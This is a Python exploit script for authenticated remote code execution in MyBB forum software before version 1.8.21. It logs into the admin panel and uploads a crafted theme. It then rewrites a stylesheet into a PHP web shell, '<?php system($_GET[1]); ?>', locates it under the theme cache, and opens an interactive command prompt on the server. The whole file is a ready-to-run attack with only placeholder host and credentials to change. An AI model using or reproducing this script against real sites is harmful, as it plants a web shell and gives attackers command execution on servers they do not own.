## MyBB < 1.8.21 Authenticated RCE 
## Made by Giovanni Chhatta
import requests
from bs4 import BeautifulSoup

def copyBody(url,cookies=''):
	return requests.get(url,cookies=cookies).text

def getCookies(url,username,password):
	url = url + "/admin/index.php"
	print("[*] Authenticating...")
	session = requests.Session()
	data = {
		'username' : username,
		'password' : password,
		'do'	   : 'login'
	}
	response = session.post(url,data)
	if response.status_code == 200:
		print("[*] Authenticated as {} with the password {} .".format(username,password))
	cookies = session.cookies.get_dict()
	return cookies

def getKey(url,cookies):
	url = url + "/admin/index.php?module=style-themes&action=import"
	body = copyBody(url,cookies)
	soup = BeautifulSoup(body, 'html.parser')
	inputTag = soup.findAll(attrs={"name" : "my_post_key"})
	return inputTag[0]['value']

def upload(url,cookies,key,payload):
	url = url + "/admin/index.php?module=style-themes&action=import"
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:66.0) Gecko/20100101 Firefox/66.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "nl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------21840354016818", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
	data = "-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"my_post_key\"\r\n\r\n"+key+"\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"import\"\r\n\r\n0\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"local_file\"; filename=\"shel1l.xml\"\r\nContent-Type: text/xml\r\n\r\n"+payload+"\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"url\"\r\n\r\n\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"tid\"\r\n\r\n1\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"version_compat\"\r\n\r\n1\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"import_stylesheets\"\r\n\r\n1\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"import_templates\"\r\n\r\n1\r\n-----------------------------21840354016818--\r\n"

	if requests.post(url, headers=headers, cookies=cookies, data=data).status_code == 200:
		print("[*] Added a new theme / stylesheet.")

def getThemeID(url,cookies):
	url = url + "/admin/index.php?module=style-themes"
	body = copyBody(url,cookies)

	soup = BeautifulSoup(body, 'html.parser')
	allTags = soup.findAll(attrs={"class" : "float_right"})[1]
	themeLink = allTags.find_all('a')[0]['href']
	themeID = themeLink[themeLink.find("tid")+4:].split("&")[0]
	return themeID

def editStylesheet(url,cookies,tid,key,payload):
	url = url + "/admin/index.php?module=style-themes&action=edit_stylesheet&mode=advanced"
	data = {
		'my_post_key' : key,
		'tid'		  : tid,
		'file'		  : payload,
		'stylesheet'  : '<?php system($_GET[1]); ?>',
		'save'		  : 'Save+Changes'
	}

	if requests.post(url,cookies=cookies,data=data).status_code == 200:
		print("[*] Edited stylesheet.")


def findShell(url,filename):
	url = url + "/cache/themes/theme"
	for i in range(0,100): # might want to increment when necessary
		tempUrl = url + str(i) + "/" + "{}".format(filename)
	
		if requests.get(tempUrl).status_code == 200:
			print("[*] Shell found in theme{}.".format(i))
			url = tempUrl
			break
	print("[*] Interacting with shell.")
	while(True):
		cmd = input("> ")
		print(requests.get(url + "?1={}".format(cmd)).text)

if __name__ == '__main__':

	filename = "910910910910910910910910xD.php"
	payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<theme>\r\n<stylesheets>\r\n<stylesheet name=\"{}.css\">\r\ngecko\r\n</stylesheet>\r\n</stylesheets>\r\n</theme>".format(filename)

	username = "admin" # Change this
	password = "Welkom1!" # Change this
	host = "http://192.168.204.247/mybb" # Change this

	cookies = getCookies(host,username,password)
	key = getKey(host,cookies)
	tid = getThemeID(host,cookies)

	upload(host,cookies,key,payload)
	editStylesheet(host,cookies,tid,key,filename)
	findShell(host,filename)
